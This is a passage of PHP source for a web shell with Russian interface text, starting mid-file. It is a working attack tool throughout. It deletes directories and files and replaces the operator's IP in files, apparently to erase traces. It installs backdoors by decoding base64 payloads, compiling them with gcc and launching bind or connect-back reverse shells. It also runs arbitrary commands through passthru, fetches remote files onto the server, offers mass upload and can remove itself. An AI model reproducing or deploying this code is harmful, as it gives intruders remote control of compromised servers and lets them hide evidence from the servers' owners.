//<tr><td><b>uname -a:</b> ".@exec('uname -a')."</td></tr>";}
if(@$_GET['delfl']){
@$delfolder=$_GET['delfolder'];
echo "DELETE FOLDER: <font color=red>".@$_GET['delfolder']."</font><br>
(All files must be writable)<br>
<a href='$php_self?deldir=1&dir=".@$delfolder."&rback=".@$_GET['rback']."'>Yes</a> || <a href='$php_self?ac=navigation&d=$d'>No</a><br><br>
";
exit;
}
if(@$_GET['deldir']){
@$dir=$_GET['dir'];
function deldir($dir)
{
$handle = @opendir($dir);
while (false!==($ff = @readdir($handle))){
if($ff != "." && $ff != ".."){
if(@is_dir("$dir/$ff")){
deldir("$dir/$ff");
}else{
@unlink("$dir/$ff");
}}}
@closedir($handle);
if(@rmdir($dir)){
@$success = true;}
return @$success;
}
$dir=@$dir;
deldir($dir);

$rback=$_GET['rback'];
@$rback=explode("/",$rback);
$crb=count($rback);
for($i=0; $i<$crb-1; $i++){
        @$x.=$rback[$i]."/";
}
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL='$php_self?ac=navigation&d=".@$x."'\">";
echo $copyr;
exit;}
if(@$_GET['replace']=="1"){
$ip=@$_SERVER['REMOTE_ADDR'];
$d=$_GET['d'];
$e=$_GET['e'];
@$de=$d."/".$e;
$de=str_replace("//","/",$de);
$e=@$e;
echo $mymenu ;
echo "
Ñðåäñòâî çàìåíû:<br>
(òû ìîæåøü çàìåíèòü ëþáîé òåêñò)<br>
Ôàéë: $de<br>
<form method=post>
1. Òâîé IP<br>
2. IP microsoft.com :)<br>
Çàìåíÿòü ýòî <input name=this size=30 value=$ip> ýòèì <input name=bythis size=30 value=207.46.245.156>
<input type=submit name=doit value=Çàìåíèòü>
</form>
";

if(@$_POST['doit']){

$filename="$d/$e";
$fd = @fopen ($filename, "r");
$rpl = @fread ($fd, @filesize ($filename));
$re=str_replace("$this","$bythis",$rpl);
$x=@fopen("$d/$e","w");
@fwrite($x,"$re");
echo "<br><center>$this çàìåíåíî íà $bythis<br>
[<a href='$php_self?ac=navigation&d=$d&e=$e'>Ïîñìîòðåòü ôàéë</a>]<br><br><Br>";

}
echo $copyr;
exit;}




if(@$_GET['yes']=="yes"){
$d=@$_GET['d']; $e=@$_GET['e'];
unlink($d."/".$e);
$delresult="$d/$e óäàëåí! <meta http-equiv=\"REFRESH\" content=\"2;URL=$php_self?ac=navigation&d=$d\">";
}
if(@$_GET['clean']=="1"){
@$e=$_GET['e'];
$x=fopen("$d/$e","w");
fwrite($x,"");
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?ac=navigation&d=$d&e=".@$e."\">";
exit;
}


if(@$_GET['e']){
$d=@$_GET['d'];
$e=@$_GET['e'];
$pinf=pathinfo($e);
if(in_array(".".@$pinf['extension'],$images)){
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?ac=navigation&d=$d&e=$e&img=1\">";
exit;}
$filename="$d/$e";
$fd = @fopen ($filename, "r");
$c = @fread ($fd, @filesize ($filename));
$c=htmlspecialchars($c);
$de=$d."/".$e;
$de=str_replace("//","/",$de);
if(is_file($de)){
if(!is_writable($de)){echo "<font color=red><br><b>ÒÎËÜÊÎ ×ÒÅÍÈÅ</b></font><br>";}}
echo $mymenu ;
echo "
Ñîäåðæèìîå ôàéëà:<br>
$de
<br>
<table width=100% border=1 cellpadding=0 cellspacing=0>
<tr><td><pre>
$c

</pre></td></tr>
</table>";
if(@$_GET['delete']=="1"){
$delete=$_GET['delete'];
echo "
Óäàëåíèå: òû óâåðåí?<br>
<a href=\"$php_self?ac=navigation&d=$d&e=$e&delete=".@$delete."&yes=yes\">Äà</a> || <a href='$php_self?no=1'>Íåò</a>
<br>
";
if(@$_GET['yes']=="yes"){
@$d=$_GET['d']; @$e=$_GET['e'];
echo $delresult;
}
if(@$_GET['no']){
echo "<meta http-equiv=\"REFRESH\" content=\"0;URL=$php_self?ac=navigation&d=$d&e=$e\">
";
}


} #end of delete
echo $copyr;
exit;
} #end of e

if(@$_GET['edit']=="1"){
@$d=$_GET['d'];
@$ef=$_GET['ef'];
if(is_file($d."/".$ef)){
if(!is_writable($d."/".$ef)){echo "<font color=red><br><b>ÒÎËÜÊÎ ×ÒÅÍÈÅ</b></font><br>";}}
echo $mymenu ;
$filename="$d/$ef";
$fd = @fopen ($filename, "r");
$c = @fread ($fd, @filesize ($filename));
$c=htmlspecialchars($c);
$de=$d."/".$ef;
$de=str_replace("//","/",$de);
echo "
Ðåäàêòèðîâàíèå:<br>
$de<br>
<form method=post>
<input type=HIDDEN name=filename value='$d/$ef'>
<textarea cols=143 rows=30 name=editf>$c</textarea>
<br>
<input type=submit name=save value='Ñîõðàíèòü èçìåíåíèÿ'></form><br>

";
if(@$_POST['save']){
$editf=@$_POST['editf'];
$editf=stripslashes($editf);
$f=fopen($filename,"w+");
fwrite($f,"$editf");
echo "<meta http-equiv=\"REFRESH\" content=\&quot;0;URL=$php_self?ac=navigation&d=$d&e=$ef\">";
exit;
}
echo $copyr;
exit;
}



echo"
<table width=100% cellpadding=1 cellspacing=0 class=hack>
<tr><td bgcolor=#4d9ef0><center><b>Íàçâàíèå</b></td><td bgcolor=#4d9ef0><center><b>Òèï</b></td><td bgcolor=#4d9ef0><b>Ðàçìåð</b></td><td bgcolor=#4d9ef0><center><b>Âëàäåëåö/Ãðóïïà</b></td><td bgcolor=#4d9ef0><b>Ïðàâà</b></td></tr>
";
$dirs=array();
$files=array();
$dh = @opendir($d) or die("<table width=100%><tr><td><center>Êàòàëîã íå ñóùåñòâóåò èëè äîñòóï ê íåìó çàïðåùåí!</center><br>$copyr</td></tr></table>");
while (!(($file = readdir($dh)) === false)) {
if ($file=="." || $file=="..") continue;
if (@is_dir("$d/$file")) {
      $dirs[]=$file;
}else{
      $files[]=$file;
      }
   sort($dirs);
   sort($files);

$fz=@filesize("$d/$file");
}

function perm($perms){
if (($perms & 0xC000) == 0xC000) {
   $info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
   $info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
   $info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
   $info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
   $info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
   $info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
   $info = 'p';
} else {
   $info = 'u';
}
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
           (($perms & 0x0800) ? 's' : 'x' ) :
           (($perms & 0x0800) ? 'S' : '-'));
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
           (($perms & 0x0400) ? 's' : 'x' ) :
           (($perms & 0x0400) ? 'S' : '-'));
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
           (($perms & 0x0200) ? 't' : 'x' ) :
           (($perms & 0x0200) ? 'T' : '-'));
return $info;
}


for($i=0; $i<count($dirs); $i++){
if(is_writable($dirs[$i])){$info="<font color=green><li>&nbsp;W</font>";}
else{$info="<font color=red><li>&nbsp;R</font>";}
$perms = @fileperms($d."/".$dirs[$i]);
$owner = @fileowner($d."/".$dirs[$i]);
if($os=="unix"){
$fileownera=posix_getpwuid($owner);
$owner=$fileownera['name'];
}
$group = @filegroup($d."/".$dirs[$i]);
if($os=="unix"){
$groupinfo = posix_getgrgid($group);
$group=$groupinfo['name'];
}
$info=perm($perms);
if($i%2){$color="#aed7ff";}else{$color="#68adf2";}
$linkd="<a href='$php_self?ac=navigation&d=$d/$dirs[$i]'>$dirs[$i]</a>";
$linkd=str_replace("//","/",$linkd);
echo "<tr><td bgcolor=$color><font face=wingdings size=2>0</font> $linkd</td><td bgcolor=$color><center><font color=blue>DIR</font></td><td bgcolor=$color>&nbsp;</td><td bgcolor=$color><center>$owner/$group</td><td bgcolor=$color>$info</td></tr>";
}

for($i=0; $i<count($files); $i++){
if(is_writable($files[$i])){$info="<font color=green><li>&nbsp;W</font>";}
else{$info="<font color=red><li>&nbsp;R</font>";}
$size=@filesize($d."/".$files[$i]);
$perms = @fileperms($d."/".$files[$i]);
$owner = @fileowner($d."/".$files[$i]);
if($os=="unix"){
$fileownera=posix_getpwuid($owner);
$owner=$fileownera['name'];
}
$group = @filegroup($d."/".$files[$i]);
if($os=="unix"){
$groupinfo = posix_getgrgid($group);
$group=$groupinfo['name'];
}
$info=perm($perms);
if($i%2){$color="#ccccff";}else{$color="#b0b0ff";}

if ($size < 1024){$siz=$size.' b';
}else{
if ($size < 1024*1024){$siz=number_format(($size/1024), 2, '.', '').' kb';}else{
if ($size < 1000000000){$siz=number_format($size/(1024*1024), 2, '.', '').' mb';}else{
if ($size < 1000000000000){$siz=number_format($size/(1024*1024*1024), 2, '.', '').' gb';}
}}}
echo "<tr><td bgcolor=$color><font face=wingdings size=3>2</font> <a href='$php_self?ac=navigation&d=$d&e=$files[$i]'>$files[$i]</a></td><td bgcolor=$color><center><a href='$php_self?ac=navigation&d=$d&download=$files[$i]' title='Download $files[$i]'><font size=2 face=Webdings color=green>`</font></a></td><td bgcolor=$color>$siz</td><td bgcolor=$color><center>$owner/$group</td><td bgcolor=$color>$info</td></tr>";
}

echo "</table></td></tr></table>";
echo $copyr;
break;

// Óñòàíîâêà áåêäîðà
case "backconnect":
echo "<b>Óñòàíîâêà áåêäîðà / îòêðûòèå ïîðòà</b>";
echo "<form name=bind method=POST>";
echo "<font face=Verdana size=-2>";
echo "<b>Îòêðûòü ïîðò </b>";
echo "<input type=text name=port size=15 value=11457>&nbsp;";
echo "<b>Ïàðîëü äëÿ äîñòóïà </b>";
echo "<input type=text name=bind_pass size=15 value=nrws>&nbsp;";
echo "<b>Èñïîëüçîâàòü </b>";
echo "<select size=\"1\" name=\"use\">";
echo "<option value=\"Perl\">Perl</option>";
echo "<option value=\"C\">C</option>";
echo "</select>&nbsp;";
echo "<input type=hidden name=dir value=".$dir.">";
echo "<input type=submit name=submit value=Îòêðûòü>";
echo "</font>";
echo "</form>";

echo "<b>Óñòàíîâêà áåêäîðà / connect-back</b>";
echo "<form name=back method=POST>";
echo "<font face=Verdana size=-2>";
echo "<b>IP-àäðåñ </b>";
echo "<input type=text name=ip size=15 value=127.0.0.1>&nbsp;";
echo "<b>Ïîðò </b>";
echo "<input type=text name=port size=15 value=31337>&nbsp;";
echo "<b>Èñïîëüçîâàòü </b>";
echo "<select size=\"1\" name=\"use\">";
echo "<option value=\"Perl\">Perl</option>";
echo "<option value=\"C\">C</option>";
echo "</select>&nbsp;";
echo "<input type=hidden name=dir value=".$dir.">";
echo "<input type=submit name=submit value=Âûïîëíèòü>";
echo "</font>";
echo "</form>";


/* port bind C */
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="C"))
{
 $w_file=fopen("/tmp/bd.c","ab+") or $err=1;
 if($err==1)
 {
 echo "<font color=red face=Fixedsys><div align=center>ÎØÈÁÊÀ! Íåâîçìîæíà çàïèñü â /tmp/bd.c</div></font>";
 $err=0;
 }
 else
 {
 fputs($w_file,base64_decode($port_bind_bd_c));
 fclose($w_file);
 $blah=exec("gcc -o /tmp/bd /tmp/bd.c");
 unlink("/tmp/bd.c");
 $bind_string="/tmp/bd ".$_POST['port']." ".$_POST['bind_pass']." &";
 $blah=exec($bind_string);
 $_POST['cmd']="ps -aux | grep bd";
 $err=0;
 }
}

/* port bind Perl */
if (!empty($_POST['port'])&&!empty($_POST['bind_pass'])&&($_POST['use']=="Perl"))
{
 $w_file=fopen("/tmp/bdpl","ab+") or $err=1;
 if($err==1)
 {
 echo "<font color=red face=Fixedsys><div align=center>ÎØÈÁÊÀ! Íåâîçìîæíà çàïèñü â /tmp/</div></font>";
 $err=0;
 }
 else
 {
 fputs($w_file,base64_decode($port_bind_bd_pl));
 fclose($w_file);
 $bind_string="perl /tmp/bdpl ".$_POST['port']." &";
 $blah=exec($bind_string);
 $_POST['cmd']="ps -aux | grep bdpl";
 $err=0;
 }
}

/* back connect Perl */
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="Perl"))
{
 $w_file=fopen("/tmp/back","ab+") or $err=1;
 if($err==1)
 {
 echo "<font color=red face=Fixedsys><div align=center>ÎØÈÁÊÀ! Íåâîçìîæíà çàïèñü â /tmp/</div></font>";
 $err=0;
 }
 else
 {
 fputs($w_file,base64_decode($back_connect));
 fclose($w_file);
 $bc_string="perl /tmp/back ".$_POST['ip']." ".$_POST['port']." &";
 $blah=exec($bc_string);
 $_POST['cmd']="echo \"Ñåé÷àñ ñêðèïò êîííåêòèòñÿ ê ".$_POST['ip']." port ".$_POST['port']." ...\"";
 $err=0;
 }
}

/* back connect C */
if (!empty($_POST['ip']) && !empty($_POST['port']) && ($_POST['use']=="C"))
{
 $w_file=fopen("/tmp/back.c","ab+") or $err=1;
 if($err==1)
 {
 echo "<font color=red face=Fixedsys><div align=center>ÎØÈÁÊÀ! Íåâîçìîæíà çàïèñü â /tmp/back.c</div></font>";
 $err=0;
 }
 else
 {
 fputs($w_file,base64_decode($back_connect_c));
 fclose($w_file);
 $blah=exec("gcc -o /tmp/backc /tmp/back.c");
 unlink("/tmp/back.c");
 $bc_string="/tmp/backc ".$_POST['ip']." ".$_POST['port']." &";
 $blah=exec($bc_string);
 $_POST['cmd']="echo \"Ñåé÷àñ ñêðèïò êîííåêòèòñÿ ê ".$_POST['ip']." port ".$_POST['port']." ...\"";
 $err=0;
 }
}
echo "<font face=Verdana size=-2>Âûïîëíåííàÿ êîìàíäà: <b>".$_POST['cmd']."</b></font></td></tr><tr><td>";
echo "<b>";
echo "<br>Ðåçóëüòàò: ";
echo "<font color=red size=2";
print "".passthru($_POST['cmd'])."";
echo "</font></b>";
break;

// Uploading
case "upload":

echo <<<HTML
<b>Çàãðóçêà ôàéëîâ</b>
<a href='$php_self?ac=massupload&d=$d&t=massupload'>* Çàãðóçèòü áîëüøîå êîëè÷åñòâî ôàéëîâ *</a><br><br>
<table>
<form enctype="multipart/form-data" action="$self" method="POST">
<input type="hidden" name="ac" value="upload">
<tr>
<td>Ôàéë:</td>
<td><input size="48" name="file" type="file"></td>
</tr>
<tr>
<td>Ïàïêà:</td>
<td><input size="48" value="$docr/" name="path" type="text"><input type="submit" value="Ïîñëàòü"></td><br>
$tend
HTML;

if (isset($_POST['path'])){

$uploadfile = $_POST['path'].$_FILES['file']['name'];
if ($_POST['path']==""){$uploadfile = $_FILES['file']['name'];}

if (copy($_FILES['file']['tmp_name'], $uploadfile)) {
    echo "Ôàéë óñïåøíî çàãðóæåí â ïàïêó $uploadfile\n";
    echo "Èìÿ:" .$_FILES['file']['name']. "\n";
    echo "Ðàçìåð:" .$_FILES['file']['size']. "\n";

} else {
    print "Íå óäà¸òñÿ çàãðóçèòü ôàéë. Info:\n";
    print_r($_FILES);
}
}


echo "<form enctype='multipart/form-data' action='?ac=upload&status=ok' method=post>
<b>Çàãðóçêà ôàéëîâ ñ óäàëåííîãî êîìïüþòåðà:</b><br>
 HTTP-ïóòü ê ôàéëó: <br>
<input type='text' name='file3' value='http://' size=40><br>
Íàçâàíèå ôàéëà èëè ïóòü ñ íàçâàíèåì ôàéëà: <br>
<input type='text' name='file2' value='$docr/' size=40><br>
<input type='submit' value='Çàãðóçèòü ôàéë'></form>";


$data = @implode("", file($file3));
$fp = @fopen($file2, "wb");
@fputs($fp, $data);
$ok = @fclose($fp);
if($ok)
{
$size = filesize($file2)/1024;
$sizef = sprintf("%.2f", $size);

print "<br><center>Âû çàãðóçèëè: <b>ôàéë <u>$file2</u> ðàçìåðîì</b> (".$sizef."êÁ) </center>";
}
else
{
print "<br><center><font color=red  size = 2><b>Îøèáêà çàãðóçêè ôàéëà</b></font></center>";
}




break;
// Tools
case "tools":
echo "<form method=post>Ãåíåðàöèÿ md5-øèôðà<br><input name=md5 size=30></form><br>";
@$md5=@$_POST['md5'];
if(@$_POST['md5']){ echo "md5 ñãåíåðèðîâàí:<br> ".md5($md5)."";}
echo "<br>
<form method=post>Êîäèðîâàíèå/äåêîäèðîâàíèå base64<br><input name=base64 size=30></form><br>";
if(@$_POST['base64']){
@$base64=$_POST['base64'];
echo "
Êîäèðîâàíî:<br><textarea rows=8 cols=80>".base64_encode($base64)."</textarea><br>
Äåêîäèðîâàíî: <br><textarea rows=8 cols=80>".base64_decode($base64)."</textarea><br>";}
echo "<br>
<form method=post>DES-êîäèðîâàíèå:<br><input name=des size=30></form><br>";
if(@$_POST['des']){
@$des=@$_POST['des'];
echo "DES ñãåíåðèðîâàí: <br>".crypt($des)."";}
echo "<br>
<form method=post>SHA1-êîäèðîâàíèå:<br><input name=sha1 size=30></form><br>";
if(@$_POST['sha1']){
@$des=@$_POST['sha1'];
echo "SHA1 ñãåíåðèðîâàí: <br>".sha1($sha1a)."";}

echo "<form method=POST>";
echo "html-êîä -> øåñòíàäöàòèðè÷íûå çíà÷åíèÿ<br><input type=text name=data size=30>";


if (isset($_POST['data']))
{
echo "<br><br><b>Ðåçóëüòàò:<br></b>";
$str=str_replace("%20","",$_POST['data']);
for($i=0;$i<strlen($str);$i++)
{
$hex=dechex(ord($str[$i]));
if ($str[$i]=='&') echo "$str[$i]";
else if ($str[$i]!='\\') echo "%$hex";
}
}
exit;
break;
// Mass Uploading
case "massupload":


echo "
Ìàñîâàÿ çàãðóçêà ôàéëîâ:<br>
<form enctype=\"multipart/form-data\" method=post>
<input type=file name=text1 size=43> <input type=file name=text11 size=43><br>
<input type=file name=text2 size=43> <input type=file name=text12 size=43><br>
<input type=file name=text3 size=43> <input type=file name=text13 size=43><br>
<input type=file name=text4 size=43> <input type=file name=text14 size=43><br>
<input type=file name=text5 size=43> <input type=file name=text15 size=43><br>
<input type=file name=text6 size=43> <input type=file name=text16 size=43><br>
<input type=file name=text7 size=43> <input type=file name=text17 size=43><br>
<input type=file name=text8 size=43> <input type=file name=text18 size=43><br>
<input type=file name=text9 size=43> <input type=file name=text19 size=43><br>
<input type=file name=text10 size=43> <input type=file name=text20 size=43><br>
<input name=where size=43 value='$docr/$foto'><br>
<input type=submit value=Çàãðóçèòü name=massupload>
</form><br>";

if(@$_POST['massupload']){
$where=@$_POST['where'];
$uploadfile1 = "$where/".@$_FILES['text1']['name'];
$uploadfile2 = "$where/".@$_FILES['text2']['name'];
$uploadfile3 = "$where/".@$_FILES['text3']['name'];
$uploadfile4 = "$where/".@$_FILES['text4']['name'];
$uploadfile5 = "$where/".@$_FILES['text5']['name'];
$uploadfile6 = "$where/".@$_FILES['text6']['name'];
$uploadfile7 = "$where/".@$_FILES['text7']['name'];
$uploadfile8 = "$where/".@$_FILES['text8']['name'];
$uploadfile9 = "$where/".@$_FILES['text9']['name'];
$uploadfile10 = "$where/".@$_FILES['text10']['name'];
$uploadfile11 = "$where/".@$_FILES['text11']['name'];
$uploadfile12 = "$where/".@$_FILES['text12']['name'];
$uploadfile13 = "$where/".@$_FILES['text13']['name'];
$uploadfile14 = "$where/".@$_FILES['text14']['name'];
$uploadfile15 = "$where/".@$_FILES['text15']['name'];
$uploadfile16 = "$where/".@$_FILES['text16']['name'];
$uploadfile17 = "$where/".@$_FILES['text17']['name'];
$uploadfile18 = "$where/".@$_FILES['text18']['name'];
$uploadfile19 = "$where/".@$_FILES['text19']['name'];
$uploadfile20 = "$where/".@$_FILES['text20']['name'];
if (@move_uploaded_file(@$_FILES['text1']['tmp_name'], $uploadfile1)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile1</i><br>";}
if (@move_uploaded_file(@$_FILES['text2']['tmp_name'], $uploadfile2)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile2</i><br>";}
if (@move_uploaded_file(@$_FILES['text3']['tmp_name'], $uploadfile3)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile3</i><br>";}
if (@move_uploaded_file(@$_FILES['text4']['tmp_name'], $uploadfile4)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile4</i><br>";}
if (@move_uploaded_file(@$_FILES['text5']['tmp_name'], $uploadfile5)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile5</i><br>";}
if (@move_uploaded_file(@$_FILES['text6']['tmp_name'], $uploadfile6)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile6</i><br>";}
if (@move_uploaded_file(@$_FILES['text7']['tmp_name'], $uploadfile7)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile7</i><br>";}
if (@move_uploaded_file(@$_FILES['text8']['tmp_name'], $uploadfile8)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile8</i><br>";}
if (@move_uploaded_file(@$_FILES['text9']['tmp_name'], $uploadfile9)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile9</i><br>";}
if (@move_uploaded_file(@$_FILES['text10']['tmp_name'], $uploadfile10)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile10</i><br>";}
if (@move_uploaded_file(@$_FILES['text11']['tmp_name'], $uploadfile11)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile11</i><br>";}
if (@move_uploaded_file(@$_FILES['text12']['tmp_name'], $uploadfile12)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile12</i><br>";}
if (@move_uploaded_file(@$_FILES['text13']['tmp_name'], $uploadfile13)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile13</i><br>";}
if (@move_uploaded_file(@$_FILES['text14']['tmp_name'], $uploadfile14)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile14</i><br>";}
if (@move_uploaded_file(@$_FILES['text15']['tmp_name'], $uploadfile15)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile15</i><br>";}
if (@move_uploaded_file(@$_FILES['text16']['tmp_name'], $uploadfile16)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile16</i><br>";}
if (@move_uploaded_file(@$_FILES['text17']['tmp_name'], $uploadfile17)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile17</i><br>";}
if (@move_uploaded_file(@$_FILES['text18']['tmp_name'], $uploadfile18)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile18</i><br>";}
if (@move_uploaded_file(@$_FILES['text19']['tmp_name'], $uploadfile19)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile19</i><br>";}
if (@move_uploaded_file(@$_FILES['text20']['tmp_name'], $uploadfile20)) {
$where=str_replace("\\\\","\\",$where);
echo "<i>Çàãðóæåíî: $uploadfile20</i><br>";}
}

exit;
break;
case "selfremover":
 print "<tr><td>";
print "<center><font color=red face=verdana size=3>Òû óâåðåí, ÷òî õî÷åøü óäàëèòü ýòîò øåëë ñ ñåðâåðà?<br><br>
<a href='$php_self?p=yes'>Äà, õî÷ó</a> | <a href='$php_self?'>Íåò, ïóñòü åùå ïîáóäåò</a><br><br><br>
Áóäåì óäàëÿòü <u>";
$path=__FILE__;
print $path;
print "</u>?</td></tr></center></table>";
die;
}

if($p=="yes"){
$path=__FILE__;
@unlink($path);
$path=str_replace("\\","/",$path);
if(file_exists($path)){$hmm="Ôàéë íåâîçìîæíî óäàëèòü!";
print "<tr><td><font color=red>Ôàéë $path íå óäàëåí!</td></tr>";
}else{$hmm="Óäàëåí";}
print "<script>alert('$path $hmm');</script>";

}
break;

?>
